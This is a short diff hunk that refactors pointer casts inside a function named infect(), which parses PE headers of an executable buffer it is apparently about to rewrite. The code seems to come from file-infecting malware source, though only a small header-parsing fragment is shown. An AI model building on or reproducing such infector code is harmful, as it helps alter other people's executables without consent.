@@ -435,8 +435,8 @@ int infect(void)
          goto free_file;
       }
 
-      IMAGE_DOS_HEADER *dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(exe_buffer);
-      IMAGE_NT_HEADERS *nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(exe_buffer+dos_header->e_lfanew);
+      IMAGE_DOS_HEADER *dos_header = RECAST(PIMAGE_DOS_HEADER,exe_buffer);
+      IMAGE_NT_HEADERS *nt_headers = RECAST(PIMAGE_NT_HEADERS,exe_buffer+dos_header->e_lfanew);
       IMAGE_DOS_HEADER *rewritten_image;
 
       if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
